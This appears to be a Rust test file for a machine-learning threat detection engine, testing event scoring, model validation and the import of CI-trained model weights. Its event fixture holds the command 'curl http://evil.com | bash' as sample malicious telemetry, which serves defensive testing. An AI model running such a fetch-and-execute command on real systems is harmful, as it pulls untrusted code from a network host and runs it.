use super::math::sigmoid;
use super::*;
use crate::{DetectionSignals, EventClass, TelemetryEvent};

fn make_event(class: EventClass, uid: u32, dst_port: Option<u16>) -> TelemetryEvent {
    TelemetryEvent {
        ts_unix: 1000,
        event_class: class,
        pid: 100,
        ppid: 1,
        uid,
        process: "bash".to_string(),
        parent_process: "sshd".to_string(),
        session_id: 1,
        file_path: None,
        file_write: false,
        file_hash: None,
        dst_port,
        dst_ip: None,
        dst_domain: None,
        command_line: Some("curl http://evil.com | bash".to_string()),
        event_size: None,
        container_runtime: None,
        container_id: None,
        container_escape: false,
        container_privileged: false,
    }
}

#[test]
fn default_model_validates() {
    let model = MlModel::default();
    model.validate().unwrap();
    assert_eq!(model.weights.len(), FEATURE_COUNT);
}

#[test]
fn sigmoid_properties() {
    assert!((sigmoid(0.0) - 0.5).abs() < 1e-10);
    assert!(sigmoid(10.0) > 0.999);
    assert!(sigmoid(-10.0) < 0.001);
    // Numerical stability for large values
    assert!(sigmoid(1000.0).is_finite());
    assert!(sigmoid(-1000.0).is_finite());
}

#[test]
fn clean_event_scores_low() {
    let engine = MlEngine::new();
    let event = make_event(EventClass::FileOpen, 1000, None);
    let signals = DetectionSignals {
        z1_exact_ioc: false,
        yara_hit: false,
        z2_temporal: false,
        z3_anomaly_high: false,
        z3_anomaly_med: false,
        z4_kill_chain: false,
        l1_prefilter_hit: false,
        exploit_indicator: false,
        kernel_integrity: false,
        tamper_indicator: false,
    };
    let features = MlFeatures::extract(&event, &signals, 0, 0, 0, 0, 0);
    let result = engine.score(&features);
    assert!(
        result.score < 0.3,
        "clean event should score low: {}",
        result.score
    );
    assert!(!result.positive);
}

#[test]
fn ioc_hit_scores_high() {
    let engine = MlEngine::new();
    let event = make_event(EventClass::ProcessExec, 0, Some(4444));
    let signals = DetectionSignals {
        z1_exact_ioc: true,
        yara_hit: false,
        z2_temporal: false,
        z3_anomaly_high: false,
        z3_anomaly_med: false,
        z4_kill_chain: false,
        l1_prefilter_hit: true,
        exploit_indicator: false,
        kernel_integrity: false,
        tamper_indicator: false,
    };
    let features = MlFeatures::extract(&event, &signals, 0, 0, 0, 2, 0);
    let result = engine.score(&features);
    assert!(
        result.score > 0.8,
        "IOC hit should score high: {}",
        result.score
    );
    assert!(result.positive);
}

#[test]
fn multi_layer_agreement_scores_highest() {
    let engine = MlEngine::new();
    let event = make_event(EventClass::ProcessExec, 0, Some(4444));
    let signals = DetectionSignals {
        z1_exact_ioc: true,
        yara_hit: false,
        z2_temporal: true,
        z3_anomaly_high: true,
        z3_anomaly_med: false,
        z4_kill_chain: true,
        l1_prefilter_hit: true,
        exploit_indicator: false,
        kernel_integrity: false,
        tamper_indicator: false,
    };
    let features = MlFeatures::extract(&event, &signals, 2, 1, 1, 3, 0);
    let result = engine.score(&features);
    assert!(
        result.score > 0.99,
        "multi-layer should score near 1.0: {}",
        result.score
    );
    assert!(result.positive);
}

#[test]
fn anomaly_only_scores_moderate() {
    let engine = MlEngine::new();
    let event = make_event(EventClass::ProcessExec, 1000, None);
    let signals = DetectionSignals {
        z1_exact_ioc: false,
        yara_hit: false,
        z2_temporal: false,
        z3_anomaly_high: true,
        z3_anomaly_med: false,
        z4_kill_chain: false,
        l1_prefilter_hit: false,
        exploit_indicator: false,
        kernel_integrity: false,
        tamper_indicator: false,
    };
    let features = MlFeatures::extract(&event, &signals, 0, 0, 0, 0, 0);
    let result = engine.score(&features);
    // Anomaly alone should be moderate — not near 1.0, not near 0.0
    assert!(
        result.score > 0.15,
        "anomaly should contribute: {}",
        result.score
    );
    assert!(
        result.score < 0.85,
        "anomaly alone shouldn't be near-certain: {}",
        result.score
    );
}

#[test]
fn model_json_round_trip() {
    let model = MlModel::default();
    let json = serde_json::to_string_pretty(&model).unwrap();
    let loaded = MlModel::from_json(&json).unwrap();
    assert_eq!(loaded.weights.len(), model.weights.len());
    assert_eq!(loaded.bias, model.bias);
    assert_eq!(loaded.threshold, model.threshold);
}

#[test]
fn model_validates_dimension_mismatch() {
    let mut model = MlModel::default();
    model.weights.pop();
    assert!(model.validate().is_err());
}

#[test]
fn model_validates_nan_weight() {
    let mut model = MlModel::default();

    model.weights[0] = f64::NAN;
    assert!(model.validate().is_err());
}

#[test]
fn top_features_are_interpretable() {
    let engine = MlEngine::new();
    let event = make_event(EventClass::ProcessExec, 0, Some(4444));
    let signals = DetectionSignals {
        z1_exact_ioc: true,
        yara_hit: false,
        z2_temporal: true,
        z3_anomaly_high: false,
        z3_anomaly_med: false,
        z4_kill_chain: false,
        l1_prefilter_hit: true,
        exploit_indicator: false,
        kernel_integrity: false,
        tamper_indicator: false,
    };
    let features = MlFeatures::extract(&event, &signals, 1, 0, 0, 1, 0);
    let result = engine.score(&features);
    // Top features should include z1_ioc_hit
    assert!(
        result
            .top_features
            .iter()
            .any(|(name, _)| name == "z1_ioc_hit"),
        "top features should include IOC hit: {:?}",
        result.top_features
    );
}

#[test]
fn hot_reload_model() {
    let mut engine = MlEngine::new();
    let mut new_model = MlModel::default();
    new_model.model_id = "updated-v2".to_string();
    new_model.weights[0] = 5.0; // boost IOC weight
    engine.reload_model(new_model).unwrap();
    assert_eq!(engine.model_id(), "updated-v2");
}

#[test]
// AC-DET-263 AC-DET-266
fn ml_feature_contract_includes_extended_runtime_and_interaction_terms() {
    assert_eq!(FEATURE_COUNT, 27);
    for name in [
        "event_size_norm",
        "container_risk",
        "file_path_entropy",
        "file_path_depth",
        "behavioral_alarm_count",
        "z1_z2_interaction",
        "z1_z4_interaction",
        "anomaly_behavioral",
    ] {
        assert!(FEATURE_NAMES.contains(&name), "feature list missing {name}");
    }
}

#[test]
fn ci_trained_model_converts_to_runtime() {
    // Simulate the JSON that `signature_ml_train_model.py` produces
    let ci_json = r#"{
            "suite": "signature_ml_linear_logit_model",
            "model_type": "linear_logit_v1",
            "model_version": "rules-2026.02.15.ml.v1",
            "trained_at_utc": "2026-02-15T04:30:00Z",
            "features": ["z1_ioc_hit", "z2_temporal_count", "z3_anomaly_high",
                          "string_sig_count", "event_class_risk"],
            "weights": {
                "z1_ioc_hit": 0.35,
                "z2_temporal_count": 0.20,
                "z3_anomaly_high": 0.15,
                "string_sig_count": 0.18,
                "event_class_risk": 0.12
            },
            "feature_scales": {
                "z1_ioc_hit": 1.0,
                "z2_temporal_count": 3.0,
                "z3_anomaly_high": 1.0,
                "string_sig_count": 5.0,
                "event_class_risk": 1.0
            },
            "bias": -0.8,
            "training_samples": 960,
            "positive_samples": 180,
            "negative_samples": 780
        }"#;

    // Should auto-detect CI format
    let model = MlModel::from_json_auto(ci_json).unwrap();
    assert_eq!(model.model_id, "ci-rules-2026.02.15.ml.v1");
    assert_eq!(model.weights.len(), FEATURE_COUNT);
    assert_eq!(model.bias, -0.8);
    assert_eq!(model.threshold, 0.5);

    // z1_ioc_hit (index 0): CI weight 0.35 * scale 1.0 = 0.35
    assert!(
        (model.weights[0] - 0.35).abs() < 1e-10,
        "z1_ioc_hit weight: {}",
        model.weights[0]
    );
    // z2_temporal_count (index 1): CI weight 0.20 * scale 3.0 = 0.60
    assert!(
        (model.weights[1] - 0.60).abs() < 1e-10,
        "z2_temporal_count weight: {}",
        model.weights[1]
    );
    // string_sig_count (index 6): CI weight 0.18 * scale 5.0 = 0.90
    assert!(
        (model.weights[6] - 0.90).abs() < 1e-10,
        "string_sig_count weight: {}",
        model.weights[6]
    );
    // Features NOT in CI model should be 0.0
    assert_eq!(model.weights[9], 0.0, "missing feature should be 0.0"); // dst_port_risk
    assert_eq!(
        model.weights[14], 0.0,
        "info-theoretic features should be 0.0"
    ); // cmdline_renyi_h2

    // Model should be valid and usable
    model.validate().unwrap();
    let mut engine = MlEngine::new();
    engine.reload_model(model).unwrap();
    assert_eq!(engine.model_version(), "rules-2026.02.15.ml.v1");
}

#[test]
// AC-DET-267
fn ci_threshold_passthrough_uses_ci_value_and_bounds_fallback() {
    let valid_threshold_json = r#"{
            "suite": "signature_ml_linear_logit_model",
            "model_type": "linear_logit_v1",
            "model_version": "rules-2026.02.21.ml.v1",
            "trained_at_utc": "2026-02-21T04:30:00Z",
            "features": ["z1_ioc_hit"],
            "weights": { "z1_ioc_hit": 0.5 },
            "feature_scales": { "z1_ioc_hit": 1.0 },
            "bias": -0.2,
            "threshold": 0.7,
            "training_samples": 100,
            "positive_samples": 30,
            "negative_samples": 70
        }"#;
    let model = MlModel::from_json_auto(valid_threshold_json).unwrap();
    assert_eq!(model.threshold, 0.7);

    let invalid_threshold_json = r#"{
            "suite": "signature_ml_linear_logit_model",
            "model_type": "linear_logit_v1",
            "model_version": "rules-2026.02.21.ml.v1",
            "trained_at_utc": "2026-02-21T04:30:00Z",
            "features": ["z1_ioc_hit"],
            "weights": { "z1_ioc_hit": 0.5 },
            "feature_scales": { "z1_ioc_hit": 1.0 },
            "bias": -0.2,
            "threshold": 0.99,
            "training_samples": 100,
            "positive_samples": 30,
            "negative_samples": 70
        }"#;
    let model = MlModel::from_json_auto(invalid_threshold_json).unwrap();
    assert_eq!(model.threshold, 0.5);
}

#[test]
// AC-DET-268
fn ci_model_validation_rejects_empty_features_non_finite_and_bad_scales() {
    let empty_features = CiTrainedModel {
        suite: "signature_ml_linear_logit_model".to_string(),
        model_type: "linear_logit_v1".to_string(),
        model_version: "v1".to_string(),
        features: vec![],
        weights: std::collections::HashMap::new(),
        feature_scales: std::collections::HashMap::new(),
        bias: 0.0,
        training_samples: 10,
        positive_samples: 5,
        negative_samples: 5,
        threshold: None,
    };
    assert!(empty_features.validate().is_err());

    let non_finite_weight = CiTrainedModel {
        suite: "signature_ml_linear_logit_model".to_string(),
        model_type: "linear_logit_v1".to_string(),
        model_version: "v1".to_string(),
        features: vec!["z1_ioc_hit".to_string()],
        weights: std::collections::HashMap::from([("z1_ioc_hit".to_string(), f64::NAN)]),
        feature_scales: std::collections::HashMap::from([("z1_ioc_hit".to_string(), 1.0)]),
        bias: 0.0,
        training_samples: 10,
        positive_samples: 5,
        negative_samples: 5,
        threshold: None,
    };
    assert!(non_finite_weight.validate().is_err());

    let bad_scale = CiTrainedModel {
        suite: "signature_ml_linear_logit_model".to_string(),
        model_type: "linear_logit_v1".to_string(),
        model_version: "v1".to_string(),
        features: vec!["z1_ioc_hit".to_string()],
        weights: std::collections::HashMap::from([("z1_ioc_hit".to_string(), 0.2)]),
        feature_scales: std::collections::HashMap::from([("z1_ioc_hit".to_string(), 1e-12)]),
        bias: 0.0,
        training_samples: 10,
        positive_samples: 5,
        negative_samples: 5,
        threshold: None,
    };
    assert!(bad_scale.validate().is_err());

    let non_finite_bias = CiTrainedModel {
        suite: "signature_ml_linear_logit_model".to_string(),
        model_type: "linear_logit_v1".to_string(),
        model_version: "v1".to_string(),
        features: vec!["z1_ioc_hit".to_string()],
        weights: std::collections::HashMap::from([("z1_ioc_hit".to_string(), 0.2)]),
        feature_scales: std::collections::HashMap::from([("z1_ioc_hit".to_string(), 1.0)]),
        bias: f64::INFINITY,
        training_samples: 10,
        positive_samples: 5,
        negative_samples: 5,
        threshold: None,
    };
    assert!(non_finite_bias.validate().is_err());
}

#[test]
// AC-DET-269
fn ci_model_conversion_tracks_feature_mapping_mismatches() {
    let ci = CiTrainedModel {
        suite: "signature_ml_linear_logit_model".to_string(),
        model_type: "linear_logit_v1".to_string(),
        model_version: "v1".to_string(),
        features: vec!["z1_ioc_hit".to_string(), "ci_only_feature".to_string()],
        weights: std::collections::HashMap::from([
            ("z1_ioc_hit".to_string(), 0.5),
            ("ci_only_feature".to_string(), 0.3),
        ]),
        feature_scales: std::collections::HashMap::from([
            ("z1_ioc_hit".to_string(), 1.0),
            ("ci_only_feature".to_string(), 1.0),
        ]),
        bias: 0.0,
        training_samples: 10,
        positive_samples: 5,
        negative_samples: 5,
        threshold: Some(0.4),
    };
    let runtime = ci.to_runtime_model();
    assert_eq!(runtime.ci_features_dropped, 1);
    assert!(runtime.runtime_features_unmapped > 0);
}

#[test]
fn ci_trained_model_auto_detect_vs_native() {
    // Native format should still work via from_json_auto
    let native_json = serde_json::to_string(&MlModel::default()).unwrap();
    let model = MlModel::from_json_auto(&native_json).unwrap();
    assert_eq!(model.weights.len(), FEATURE_COUNT);
    model.validate().unwrap();
}
